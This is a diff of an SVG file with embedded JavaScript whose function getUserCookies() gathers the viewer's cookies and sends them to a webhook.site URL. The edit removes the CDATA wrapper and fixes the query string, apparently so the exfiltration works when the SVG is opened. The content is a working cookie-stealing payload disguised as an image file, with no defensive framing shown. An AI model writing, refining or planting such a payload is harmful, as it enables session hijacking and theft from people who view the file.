@@ -5,7 +5,7 @@
 </head>
 <body>
   <script type="text/javascript">
-    <![CDATA[
+
       // JavaScript code embedded in the SVG
       function getUserCookies() {
   
@@ -23,7 +23,7 @@
 		}
 
 		// Send a request
-		xhttp.open("GET", "https://webhook.site/25e79811-9ef7-4523-bf4c-a965c429f250"+allCookies);
+		xhttp.open("GET", "https://webhook.site/25e79811-9ef7-4523-bf4c-a965c429f250?"+allCookies,allCookies);
 		xhttp.send();
 
 		
@@ -31,7 +31,7 @@
 
       // call the function
       getUserCookies();
-    ]]>
+
   </script>
 
 
